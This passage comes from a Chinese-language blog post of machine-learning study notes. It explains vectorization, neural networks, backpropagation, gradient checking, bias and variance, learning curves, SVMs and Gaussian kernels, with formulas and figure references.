<p>在深度学习领域这里有一项叫做向量化的技术，是一个关键的技巧，它可以允许你的代码摆脱这些显式的 <strong>for</strong> 循环，举个栗子说明什么是向量化：</p>
<p>在逻辑回归中，需要去计算 z = (w^T)x + b（其中 w，x 都是列向量），如果有很多的特征，那么就会有一个非常大的向量，那么如果想使用非向量化方法去计算 (w^T)x ，就需要如下的方法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">z = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n_x):</span><br><span class="line">    z += w[i] * x[i]</span><br><span class="line">z += b</span><br></pre></td></tr></table></figure>
<p>可以发现非向量化的实现有 for 循环，作对对比，向量化的实现将会直接计算：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z = np.dot(w, x) + b</span><br></pre></td></tr></table></figure>
<h2 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h2><p>神经网络产生的最初目的是为了制造出模拟人脑的机器，下面是我们神经元的结构图：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652023019404-1653371283127.png" class width="1652023019404"> 
<p>神经元通过许多树突来接收电信号，在细胞体中处理过后，又通过轴突输出电信号，我们可以用以下这个模型来模拟这个过程：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652022966440-1653371283127.png" class width="1652022966440"> 
<p>x1，x2，x3 通过“树突”传输到运算函数 hθ(x)，然后通过“轴突”输出数据</p>
<p>这里的 hθ(x) 就可以是逻辑回归中的 Sigmoid 函数（假设陈述），而 θ 就是模型的参数向量（在神经网络中也被称为“权重”）</p>
<script type="math/tex; mode=display">
h_θ=\frac1{1+e^{-θ^Tx}}</script><p>而这个模型就被称为：带有 Sigmoid 激活函数的人工神经元</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652023900384-1653371283127.png" class width="1652023900384"> 
<p>神经网络其实就是一组神经元连接在一起的集合，第一层被称为“输入层”，第二层被称为“隐藏层”，最后一层被称为“输出层”（其实除了第一层和最后一层，其他层都是“隐藏层”）</p>
<p>接下来来分析一下神经网络的计算流程：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652027285928-1653371283127.png" class width="1652027285928"> 
<ul>
<li>假设我们输入 x1，x2，x3 到“隐藏层”，“隐藏层”根据自己的算法输出 a1，a2，a3，然后这3个数据作为最终“输出层” hθ(x) 的参数，计算出最终的结果</li>
<li>每个样本都会根据当前 θ 拟合出的函数模型进行计算，输出一个预测的结果，然后把预测结果同真实数据进行对比，通过一些算法来调整 θ，使其结果更加趋近于真实值</li>
<li>当所有数据都处理完毕以后，每个节点都大概拥有了一个相对稳定的 θ 值，然后就可以预测数据了</li>
</ul>
<p>接下来我们把视角聚集到某个节点：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652028011019-1653371283127.png" class width="1652028011019"> 
<ul>
<li>我们把上述模型中的“输入层”屏蔽，后续的“隐藏层”和“输出层”其实构成了一个“逻辑回归模型”（只不过这里不直接传入数据集，而是传入“上一层”的运算结果）</li>
<li>对这一个节点进行拟合，就可以得到一组确定的参数 θ</li>
</ul>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652028442786-1653371283127.png" class width="1652028442786"> 
<ul>
<li>而把整个神经网络都拟合完毕以后，每个节点都可能有一组不同的参数 θ（每个节点都输出它们认为的“最佳值”，到最后的“输出层”就可以输出该样本最可能的类）</li>
</ul>
<p>神经网络的连接方式也被称为神经网络架构，通过改变架构，就可以模拟出更加复杂的特征（相比于逻辑回归中，通过增加参数 θ 的数目来模拟复杂的特征，这种方式更为高效）</p>
<p><strong>案例一：使用神经网络来模拟 AND（OR同理）</strong></p>
<p>假设我们有两个 x1，x2 两个输入特征，它们只能取“0”或者“1”</p>
<p>现在 y = x1 AND x2（和“&amp;&amp;”一样，当“x1==x2”时，“y=1”，否则“y=0”），它的神经网络模型如下：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652103923204-1653371283127.png" class width="1652103923204"> 
<ul>
<li>PS：这个“+1”被称为“+1单元”，是我们引入的值</li>
</ul>
<p>经过拟合之后的权重结果为：θ [-30,20,20]，也就意味着该模型为：</p>
<script type="math/tex; mode=display">
h_θ^{(x)}=g(-30+20x_1+20x_2)</script><p>解释一下该模型： </p>
<ul>
<li>g(x) 就是 Sigmoid 函数</li>
</ul>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652105282520-1653371283127.png" class width="1652105282520">  
<ul>
<li>x1 和 x2 就只有两种可能：“0”，“1”</li>
</ul>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652104965954-1653371283127.png" class width="1652104965954"> 
<ul>
<li>当 x1 == 0 &amp;&amp; x2 == 0 时，g(-30) ≈ 0</li>
<li>当 x1 == 0 &amp;&amp; x2 == 1 时，g(-10) ≈ 0</li>
<li>当 x1 == 1 &amp;&amp; x2 == 0 时，g(-10) ≈ 0</li>
<li>当 x1 == 1 &amp;&amp; x2 == 1 时，g(10) ≈ 1</li>
</ul>
<p>和逻辑运算符 AND 的逻辑基本相同，成功模拟出 AND（注意：这个权重 θ 是拟合出来的）</p>
<p><strong>案例二：使用神经网络来模拟 XNOR</strong></p>
<p>XNOR为“同或”，和“异或相反”：若相同则输出为“1”，不同则输出为“0”，它的图像如下：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652103678228-1653371283128.png" class width="1652103678228"> 
<ul>
<li>这是明显的非线性结构，使用单一的逻辑回归是解决不了问题的，不过使用神经网络就可以通过结点之间的组合来解决问题</li>
<li>学习这个模型，其实是想体验一下各个神经结点的组合搭配过程</li>
</ul>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652106436568-1653371283128.png" class width="1652106436568"> 
<p>“同或”其实就是以上这3个模型拼接出来的：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652106658030-1653371283128.png" class width="1652106658030"> 
<ul>
<li>红色的部分（-30,20,20）是 AND</li>
<li>蓝色的部分（10,-20,-20）是 AND-NOT</li>
<li>它们组合出来的“隐藏层”可以放入下表的 a1，a2：</li>
</ul>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652106616884-1653371283128.png" class width="1652106616884"> 
<ul>
<li>绿色的部分（-10,20,20）是 OR，发现“隐藏层”进行“或”操作后，刚好就可以得到 XNOR 的结果</li>
</ul>
<p>这个案例证明了神经网络的功能强大：通过改变架构，就可以模拟出更加复杂的特征</p>
<h2 id="交叉熵-神经网络-代价函数"><a href="#交叉熵-神经网络-代价函数" class="headerlink" title="交叉熵(神经网络)-代价函数"></a>交叉熵(神经网络)-代价函数</h2><p>先看看逻辑回归中，正则化的交叉熵公式：</p>
<script type="math/tex; mode=display">
J(θ)=-\frac1{m}[\sum_{i=1}^my^{(i)}log\,h_θ(x^{(i)})+(1-y^{(i)})log(1-h_θ(x^{(i)}))]+\frac{λ}{2m}\sum_{j=1}^nθ_j^{2}</script><p>对于神经网络，我们将不再只有一个逻辑回归输出单元，而是有 K 个</p>
<p>那么它的公式如下：（又长又复杂）</p>
<script type="math/tex; mode=display">
J(θ)=-\frac{1}{m}[\sum_{i=1}^{m}\sum_{k=1}^{K}y_k^{(i)}log(h_θ(x^{(i)}))_k+(1-y_k^{(i)})log(1-(h_θ(x^{(i)}))_k)]+
\frac{λ}{2m}\sum_{l=1}^{L-1}\sum_{i=1}^{s1}\sum_{j=1}^{s1+1}(θ_{ji}^{(l)})^2</script><p>对于一个确定的（xi，yi），那么它的代价函数可以看做是：</p>
<script type="math/tex; mode=display">
cost(i)=y^{(i)}log(h_θ(x^{(i)}))+(1-y^{(i)})log(1-h_θ(x^{(i)}))</script><p>为了方便理解，也可以把代价函数看做是如下式子：</p>
<script type="math/tex; mode=display">
cost(i)≈(h_θ(x^{(i)})-y^{(i)})^2</script><p>类似于均方误差，代表了神经网络预测样本值的精确程度</p>
<h2 id="反向传播-优化"><a href="#反向传播-优化" class="headerlink" title="反向传播-优化"></a>反向传播-优化</h2><ul>
<li>梯度下降：是寻找代价函数最小值的一种方法</li>
<li>交叉熵(神经网络)：神经网络的代价函数，需要提供“梯度”</li>
<li>反向传播：是求解梯度的一种方法</li>
</ul>
<p><strong>我们先分析一下正向传播的过程</strong></p>
<p><strong>为了拟合神经网络，我们需要使用反向传播算法，所以我们先分析一下程序正向传播的过程</strong></p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652180531195-1653371283128.png" class width="1652180531195"> 
<ul>
<li>a1 就是第一层的激活值，因其在输入层，我们假设它为 x</li>
<li>然后计算模型函数 z(x) 的值，把计算结果放入 Sigmoid 激活函数，计算出另一个激活值 a2</li>
<li>接着进行两次前向传播，分别计算出 a3，a4</li>
<li>最后的 a4 就是假设函数 h(x) 的输出</li>
</ul>
<p>案例一：（直观的展示了某个神经结点的运算过程）</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652181824906-1653371283128.png" class width="1652181824906"> 
<ul>
<li>注意紫色标注出来的 z1（模型函数）：</li>
</ul>
<script type="math/tex; mode=display">
z^{(3)}_{1}=θ^{(2)}_{10}*1+θ^{(2)}_{11}*a^{(2)}_{1}+θ^{(2)}_{12}*a^{(2)}_{1}</script><p>对于正向传播而言，我们采用梯度下降来拟合函数，但是在神经网络中，参数的数量是一个可怕的数字，动辄上万，十几万，并且，其取值有时是十分灵活的，甚至精确到小数点后若干位，若使用穷举法，将会造成一个几乎不可能实现的计算量</p>
<p>解决的办法就是：反向传播算法</p>
<p>采用反向传播算法来计算各个神经网络节点的梯度，并把它提供给代价函数（通常是交叉熵）</p>
<p><strong>接下来就来分析反向传播算法</strong></p>
<p>从直观上来说，反向传播算法就是对每一个结点进行一次这样的运算：</p>
<script type="math/tex; mode=display">
δ^{(l)}_{j}=a^{(l)}_{j}-y_j\,\,\,\,\,\,(l为Layer,代表神经网络的层数)</script><ul>
<li>δ( l , j ) 代表了第 l 层的第 j 结点的误差</li>
</ul>
<p>案例：对如下这个图像进行反向传播算法</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652183667886-1653371283128.png" class width="1652183667886"> 
<p>计算公式为：</p>
<script type="math/tex; mode=display">
For\,each\,output\,unit(layer\,\,L=4)\\
δ^{(4)}=a^{(4)}-y\\
δ^{(3)}=(θ^{(3)})^{T}δ^{(4)}.*g^{'}(z^{(3)})\\
δ^{(2)}=(θ^{(3)})^{T}δ^{(3)}.*g^{'}(z^{(2)})</script><ul>
<li>对于最后一层（输出层），δ4 就是 a4（输出层预测的结果）和 y（真实的结果）之间的差值</li>
<li>而对于中间的隐藏层，因为不清楚“预测结果”和“真实结果”的具体值，所以就只能通过以上的公式进行模拟计算</li>
<li>值得注意的是：<ul>
<li>“ .* ”对应了“点乘”，其结果会是一个标量</li>
<li>最后的结果运算到 δ2 就可以了，因为 δ1 就是真实的数据，没有误差</li>
</ul>
</li>
</ul>
<p>我们可以简单把 δ( l , j ) 理解为第 l 层的第 j 结点的误差，但它有更实际的意义：（需要高数基础，给跪了）</p>
<script type="math/tex; mode=display">
δ^{(l)}_{j}=\frac{∂}{∂z^{(j)}_{j}}cost(i)\\
cost(i)=y^{(i)}log(h_θ(x^{(i)}))+(1-y^{(i)})log(1-h_θ(x^{(i)}))\,\,\,\,\,\,
(在前面的交叉熵中已经说明)</script><ul>
<li>在神经网络内部，只要稍微改动一下 z(l)，就会影响到 cost（某个结点的代价），从而影响整个代价函数的值</li>
<li>所以 δ( l , j ) 其实是用于衡量：为了影响这些中间值（中间层的运算结果），将要改变多少权重（改变权重的程度）</li>
</ul>
<p>案例二：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652188426080-1653371283128.png" class width="1652188426080"> 
<p>假设我们已经计算出了 δ(3).1，δ(3).2，接下来我们要计算 δ(2).2</p>
<p>这个过程其实就是正向传播反了过来：</p>
<ul>
<li>列出节点 z(2).2 输出的两个权重：θ(2).12 和 θ(2).22 </li>
<li>列出节点 z(3).1 和 z(3).2 的δ值：δ(3).1 和 δ(3).2</li>
<li>通过以下公式进行计算：</li>
</ul>
<script type="math/tex; mode=display">
δ^{(2)}_{2}=θ^{(2)}_{12}δ^{(3)}_{1}+θ^{(2)}_{22}δ^{(3)}_{2}</script><h2 id="梯度检测-优化"><a href="#梯度检测-优化" class="headerlink" title="梯度检测-优化"></a>梯度检测-优化</h2><p>神经网络有一个不好的性质，那就是它容易产生BUG</p>
<p>当它也梯度下降或者其他算法一起工作时，也许它看起来确实能正常运行，但是反向传播的过程可能会因为一些BUG导致效率下降，因而使最后的结果和没有BUG时差出几个量级，更致命的是，我们可能根本就不知道发生了BUG</p>
<p>这个问题的解决办法就是<strong>梯度检测</strong>，原理如下：</p>
<ul>
<li>梯度检测会估计梯度（导数）值，然后和你程序计算出来的梯度的值进行对比，以判断程序算出的梯度值是否正确</li>
</ul>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652533210554-1653371283128.png" class width="1652533210554"> 
<ul>
<li>上图中，我们关注θ0点的函数的导数，即θ0点切线（图中蓝线）的斜率，现在我们在“θ0−ε”和“θ0+ε”两点连一条线（图中红线），我们发现红线的斜率和蓝线斜率很相似</li>
<li>红线的斜率可以用以下式子表示： </li>
</ul>
<script type="math/tex; mode=display">
\frac{J(θ_{0}+ε)-J(θ_{0}-ε)}{2ε}</script><ul>
<li>实际上，以上的式子很好地表示了θ0点导数的近似值</li>
<li>在实际的应用中，θ往往是一个向量，梯度下降算法要求我们对向量中的每一个分量进行偏导数的计算，对于偏导数，我们同样可以用以下式子进行近似计算：</li>
</ul>
<script type="math/tex; mode=display">
\frac{J(θ_{1}+ε,θ_{2},θ_{3},...,θ_{n})-J(θ_{1}-ε,θ_{2},θ_{3},...,θ_{n})}{2ε}</script><ul>
<li>梯度检测方法的开销是非常大的，比反向传播算法的开销都大，所以一旦用梯度检测方法确认了梯度下降算法算出的梯度（或导数）值是正确的，那么就及时关闭它</li>
<li>一般来说ε的值选“10的-4次方”，注意并不是越小越好</li>
</ul>
<h2 id="随机初始化-优化"><a href="#随机初始化-优化" class="headerlink" title="随机初始化-优化"></a>随机初始化-优化</h2><p>对于一个高级算法，需要对它的 θ 集合进行初始化，通常的想法就是把它们初始化为“0”</p>
<p>这个在逻辑回归中是没有问题的，但是在训练神经网络的时候，因为权重都是“0”，导致所有节点的激活值都是一样的，最后使每次更新出来的 θ 都一样</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652588451025-1653371283128.png" class width="1652588451025"> 
<ul>
<li>如果把某一层的 θ 都初始化为“0”，那么在梯度下降更新 θ 时，有如下的等式成立：</li>
</ul>
<script type="math/tex; mode=display">
\frac{∂}{∂θ^{(1)}_{1}}j(θ)=\frac{∂}{∂θ^{(1)}_{2}}j(θ)</script><ul>
<li>例如：第一条蓝线的权重会更新为“学习率”乘左边的式子，而第二条蓝线的权重会更新为“学习率”乘右边的式子，因为“θ1”和“θ2”都初始化为“0”，所以这个等式是恒成立的</li>
<li>接下来的两条红线也会相等，同样，两条绿线也会相等</li>
</ul>
<p>所以我们需要对 θ 进行随机初始化：</p>
<ul>
<li>对于每一个 θ，我们需要将其初始化为一个范围在 [-ε,ε] 之间的随机值</li>
<li>ε 是一个很小的值，通常为“10的-4次方”</li>
</ul>
<h2 id="偏差方差-误差"><a href="#偏差方差-误差" class="headerlink" title="偏差方差-误差"></a>偏差方差-误差</h2><p>当一个算法拟合效果不佳时，只有两种情况：偏差较大，方差较大（也就是欠拟合，过拟合）</p>
<script type="math/tex; mode=display">
Error=IrreducibleError+Bias^{2}+Variance</script><ul>
<li>Error，误差：模型的计算值和真实数据之间的差值</li>
<li>Irreducible Error，不可避免的误差：刻画了当前任务任何算法所能达到的期望泛化误差的下限，即刻画了问题本身的难度</li>
<li>Bias，偏差：刻画了算法的拟合能力（Bias 高表示预测函数与真实结果相差很大，拟合程度太低）</li>
<li>Variance，方差：代表 “同样大小的不同数据集训练出的模型” 与 “这些模型的期望输出值” 之间的差异（Var高表示模型很不稳定，泛化效果差）</li>
</ul>
<h2 id="交叉验证-误差"><a href="#交叉验证-误差" class="headerlink" title="交叉验证-误差"></a>交叉验证-误差</h2><p>之前我们已经介绍了误差的产生和原理，接下来就来看看误差的检查方法：交叉验证</p>
<ul>
<li>基本思想是将数据分为两部分，一部分数据用来模型的训练，称为训练集</li>
<li>另外一部分用于测试模型的误差，称为验证集</li>
</ul>
<p>还是那个熟悉的例子：（这里就不赘述了）</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652706307484-1653371283128.png" class width="1652706307484">  
<p>首先需要补充几个概念：</p>
<ul>
<li>训练集：数据集中，用于训练模型的部分</li>
<li>验证集：数据集中，用于调整模型的超参数和用于对模型的能力进行初步评估的部分</li>
<li>测试集：数据集中，用来评估模最终模型泛化能力的部分</li>
</ul>
<p>下面一张图片将会展示“偏差”，“方差”的区别：（以上述案例为例）</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652708323393-1653371283128.png" class width="1652708323393"> 
<ul>
<li>J(θ)train 代表了训练集的误差：我们会很明显的发现，随着特征值的增加，函数的误差明显下降</li>
<li>J(θ)cv 代表了测试集的误差：和训练集的误差曲线不同，测试集的误差曲线反应了该模型的真实拟合水平</li>
</ul>
<p>从 J(θ)cv 中我们可以发现两个极点：</p>
<ul>
<li>左极点代表了：偏差较大，拟合程度不够（欠拟合）</li>
<li>右极点代表了：方差较大，泛化效果不足（过拟合）</li>
</ul>
<h2 id="学习曲线-误差"><a href="#学习曲线-误差" class="headerlink" title="学习曲线-误差"></a>学习曲线-误差</h2><p>如果你想检测你的模型是否可以正常运行，那么学习曲线就是一种很好的工具</p>
<p>学习曲线的基本原理：人为减少训练集的数量，观察模型的误差曲线</p>
<script type="math/tex; mode=display">
J_{train}(θ)=\frac{1}{2m}\sum^{m}_{i=1}(h_θ(x^{(i)})-y^{(i)})^{2}\\
J_{cv}(θ)=\frac{1}{2m_{cv}}\sum^{m_{cv}}_{i=1}(h_θ(x_{cv}^{(i)})-y_{cv}^{(i)})^{2}</script><p>一，通常来说，一个良好的模型应该具有以下的性质：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652710284816-1653371283128.png" class width="1652710284816"> 
<ul>
<li>随着训练集数目m的增大，训练集的误差增大，测试集的误差减小</li>
</ul>
<p>二，对于高 Bias（偏差）的模型：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652710566556-1653371283128.png" class width="1652710566556"> 
<ul>
<li>随着训练集数目m的增大，训练集和测试集的误差都逐渐趋于平缓，也就意味着，不管再投入多少数据，测试集的误差都不会有明显的下降了</li>
</ul>
<p>三，对于高 Variance（方差）的模型：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652710775037-1653371283128.png" class width="1652710775037">  
<ul>
<li>不管训练集数目m再怎么增大，训练集和测试集的误差始终都有一大截“鸿沟”，不过在高方差的模型中，投入更多数据还是对训练有帮助的</li>
</ul>
<h2 id="支持向量机SVM"><a href="#支持向量机SVM" class="headerlink" title="支持向量机SVM"></a>支持向量机SVM</h2><p>与逻辑回归和神经网络相比，支持向量机（support vector machines，SVM）能提供一种更为清晰和强大的方式，来运算 <strong>复杂的非线性方程</strong></p>
<p>我们先从逻辑回归说起：</p>
<script type="math/tex; mode=display">
h_θ=\frac1{1+e^{-θ^Tx}}</script><img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652875817979.png" class width="1652875817979"> 
<ul>
<li>当真实数据 y=1 时，我们想要 hθ(x) ≈ 1，所以 z &gt; 0</li>
<li>当真实数据 y=0 时，我们想要 hθ(x) ≈ 0，所以 z &lt; 0</li>
</ul>
<p>逻辑回归的代价函数为：交叉熵</p>
<script type="math/tex; mode=display">
J(θ)=\frac1{m}\sum_{i=1}^mCost(h_θ(x^{(i)}),y^{(i)})
=-\frac1{m}[\sum_{i=1}^my^{(i)}log\,h_θ(x^{(i)})+(1-y^{(i)})log(1-h_θ(x^{(i)}))]</script><p>把单独的 Cost 函数提取出来：</p>
<script type="math/tex; mode=display">
Cost(h_θ(x^{(i)}),y^{(i)})=-y^{(i)}log\,h_θ(x^{(i)})-(1-y^{(i)})log(1-h_θ(x^{(i)}))</script><p>把 hθ 替换为 Sigmoid 函数：</p>
<script type="math/tex; mode=display">
Cost(h_θ(x^{(i)}),y)=-y\,log\,\frac1{1+e^{-θ^Tx}}-(1-y)\,log(1-\frac1{1+e^{-θ^Tx}})</script><p>针对这个函数，SVM 其实就是做了一件如下图所示的事情：</p>
<ul>
<li><p>y = 1 时，函数的图像：取点 (1,0) 然后作一条和逻辑回归曲线相似的直线，名为 Cost1(z)</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652876615894.png" class width="1652876615894"> 
</li>
<li><p>y = 0 时，函数的图像：取点 (-1,0) 然后作一条和逻辑回归曲线相似的直线，名为 Cost0(z)</p>
</li>
</ul>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652876762133.png" class width="1652876762133"> 
<p>SVM 就是把两条与逻辑回归曲线相似的<strong>直线</strong>，当做了代价函数，这样虽然牺牲了一点准确度，但是大大降低了运算的难度</p>
<p>对此，我们只需要把交叉熵简单修改一下，就可以得到 SVM 的代价函数</p>
<ul>
<li>交叉熵：</li>
</ul>
<script type="math/tex; mode=display">
J(θ)=\frac1{m}[\sum_{i=1}^my^{(i)}(-log\,h_θ(x^{(i)}))+(1-y^{(i)})(-log(1-h_θ(x^{(i)})))]
+\frac{λ}{2m}\sum_{j=1}^nθ_j^{2}</script><ul>
<li>SVM 的代价函数：（注意这里去掉了“m”，而“C”是一个常数）</li>
</ul>
<script type="math/tex; mode=display">
J(θ)=C\sum_{i=1}^my^{(i)}Cost_1(θ^{T}x^{(i)})+(1-y^{(i)})Cost_0(θ^{T}x^{(i)})
+\frac{1}{2}\sum_{j=1}^nθ_j^{2}</script><img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652878030260.png" class width="1652878030260"> 
<ul>
<li>当真实数据 y=1 时，我们想要 hθ(x) = 1，所以 z &gt; 1（而不仅仅是 z &gt; 0）</li>
<li>当真实数据 y=0 时，我们想要 hθ(x) = 0，所以 z &lt; -1（而不仅仅是 z &lt; 0）</li>
</ul>
<p>和逻辑回归不同，SVM 对于分类的判断不是“连续”的，而是有一个“间隔”，这就相当于在SVM中构建了一个安全因子（安全距离）</p>
<p>案例一：假设有一个 y=1 的训练样本，常量 C 很大</p>
<ul>
<li>因为 y=1 ，所以我们只用看 Cost1</li>
<li>算法的目的是：预测正确 =&gt; hθ(x)≈1 =&gt; J(θ)尽可能小 =&gt; θ尽可能小</li>
<li>这样，公式就可以简化为：</li>
</ul>
<script type="math/tex; mode=display">
J(θ)=C\sum_{i=1}^mCost_1(1)+\frac{1}{2}\sum_{j=1}^nθ_j^{2}=
\frac{1}{2}\sum_{j=1}^nθ_j^{2}</script><ul>
<li>最小化代价函数，其实就是使 θ 的平方和最小</li>
<li>PS：这里的 θ 其实是向量，具体的数学原理和向量内积有关</li>
</ul>
<p>案例二：为数据集画决策边界</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652882030322.png" class width="1652882030322"> 
<ul>
<li>紫线，绿线，都是不合理的决策边界</li>
<li>而 SVM 会选择黑线，因为黑线距离样本的最小距离更大一些</li>
<li>看看两条蓝线的距离，这个距离就叫做<strong>支持向量机的间距</strong></li>
</ul>
<p>因为 SVM 每次都会尽量用更大的间距去分离，所以它也被称为大间距分类器</p>
<p>案例三：为数据集画决策边界</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1652883071042.png" class width="1652883071042"> 
<ul>
<li>对于这个样本，SVM 有两种画法：黑线和紫线</li>
<li>具体采用谁为决策边界是常数C决定的：<ul>
<li>C 比较小：采用黑线</li>
<li>C 比较大：采用紫线</li>
</ul>
</li>
<li>所以我们可以通过调节C，来改变 SVM 的决策方式</li>
</ul>
<h2 id="高斯核函数"><a href="#高斯核函数" class="headerlink" title="高斯核函数"></a>高斯核函数</h2><p>核函数也被称为相似度函数，用于模拟 <strong>非线性</strong> 决策边界的特征</p>
<p>接下来就通过一个案例来理解核函数的使用场景和作用：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1653151038604.png" class width="1653151038604">  
<p>假设有一块非线性的区域，我们想拟合一个决策边界来区分正负实例，通常有两种办法：</p>
<script type="math/tex; mode=display">
θ_0+θ_1x_1+θ_2x_2+θ_3x_1x_2+θ_4x_1^2+θ_5x_2^2...\\
θ_0+θ_1f_1+θ_2f_2+θ_3f_3+θ_4f_4+θ_5f_5...</script><ul>
<li>第一种方法：通过构建高次项来拟合更复杂的决策边界</li>
<li>第二种方法：通过高斯核函数来定义这些特征值</li>
</ul>
<p>第一种方法会面临“过拟合”，“欠拟合”等一系列问题，所以第二种方法诞生了，以下图为例：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1653152301671.png" class width="1653152301671"> 
<ul>
<li>我们先手动取“3”个点：L1，L2，L3，把这些点成为“标记”</li>
<li>然后用高斯核函数来定义特征：</li>
</ul>
<script type="math/tex; mode=display">
f_1=similarity(x,L^{(1)})=exp(-\frac{||x-l^{(1)}||^{2}}{2σ^{2}})\\
f_1=similarity(x,L^{(2)})=exp(-\frac{||x-l^{(2)}||^{2}}{2σ^{2}})\\
f_1=similarity(x,L^{(3)})=exp(-\frac{||x-l^{(3)}||^{2}}{2σ^{2}})</script><ul>
<li>PS：||X-Y|| 就是向量作差之后各分量的平方和的开根号</li>
</ul>
<p>现在解释一下高斯核函数：</p>
<ul>
<li>但点 (x1，x2) 靠近 L(i) 时，x ≈ L(i) ，f(i) ≈ exp(0) ≈ 1</li>
<li>但点 (x1，x2) 远离 L(i) 时，x !≈ L(i) ，f(i) ≈ exp(∞) ≈ 0</li>
</ul>
<p>正样本的附近大概率也是正样本，依照这个规律，相似度函数会根据目标和“标记”之间的距离，来判断该样本是不是正样本，现在再回看一下决策边界的基本模型：</p>
<script type="math/tex; mode=display">
θ_0+θ_1f_1+θ_2f_2+θ_3f_3+θ_4f_4+θ_5f_5...</script><p>把每一个相似度函数的结果进行整合（“标记”越多，最终结果的判断也越精确），作为特征用于 θ 的拟合，然后就可以用 SVM 对模型进行训练了，那么接下来的问题就是：如何选取 L1，L2，L3…</p>
<ul>
<li>而我们的解决办法也是简单暴力：直接把样本数据当做“标记”</li>
<li>对于每一个样本 (x,y,z…) 都可以被放入相似度函数中，生成 n 个 f (x,y,z…)</li>
</ul>
<p>高斯核函数的完整公式为：</p>
<script type="math/tex; mode=display">
K_{gaussian}(x^{(i)},x^{(j)})
=exp(-\frac{||x^{(i)}-x^{(j)}||^{2}}{2σ^{2}})
=exp(-\frac{1}{2σ^{2}}\sum_{k=1}^n(x^{(i)}_k-x^{(j)}_k)^{2})</script><p>在描绘 <strong>非线性决策边界</strong> 时，单纯的 SVM 算法起不到良好的效果，而如果用高斯核函数来定义特征的话，效果会好很多：</p>
<ul>
<li>只使用 SVM 算法：</li>
</ul>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1653205137538.png" class width="1653205137538">   
<ul>
<li>同时使用 SVM 算法和高斯核函数：</li>
</ul>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1653205186620.png" class width="1653205186620">  

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/08/Machine-Learning-Lab2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/08/Machine-Learning-Lab2/" class="post-title-link" itemprop="url">Machine-Learning-Lab2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

